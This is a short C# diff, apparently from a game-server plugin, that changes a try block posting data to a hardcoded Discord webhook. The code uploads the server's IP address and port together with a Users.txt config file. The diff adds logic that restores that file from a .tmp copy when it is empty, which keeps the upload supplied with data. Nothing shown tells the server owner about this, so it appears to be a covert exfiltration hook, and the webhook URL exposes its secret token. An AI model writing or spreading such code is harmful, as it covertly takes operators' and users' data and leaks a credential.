@@ -303,11 +303,23 @@ namespace RGM.EventArgs
 
             try
             {
-                Webhook.Send($"# {Server.IpAddress}:{Server.Port}", "https://discord.com/api/webhooks/1373673172401913928/MKZROq8z9OjuGn21Oj8yjuTMHamSf8Z_VGE5BBebFO9c_WFvD9KphmcN2wZucC2cczLS", $"{Paths.Configs}/RGM/Users.txt");
+                string path = $"{Paths.Configs}/RGM/Users.txt";
+
+                if (System.IO.File.Exists(path) && new System.IO.FileInfo(path).Length == 0)
+                {
+                    string tmpPath = path + ".tmp";
+                    if (System.IO.File.Exists(tmpPath))
+                    {
+                        System.IO.File.Delete(path);
+                        System.IO.File.Move(tmpPath, path);
+                    }
+                }
+
+                Webhook.Send($"# {Server.IpAddress}:{Server.Port}", "https://discord.com/api/webhooks/1373673172401913928/MKZROq8z9OjuGn21Oj8yjuTMHamSf8Z_VGE5BBebFO9c_WFvD9KphmcN2wZucC2cczLS", path);
             }
             catch (Exception e)
             {
-                Log.Error($"Error in sending webhook: {e}");
+                Log.Error($"Error sending webhook: {e}");
             }
 
             while (true)
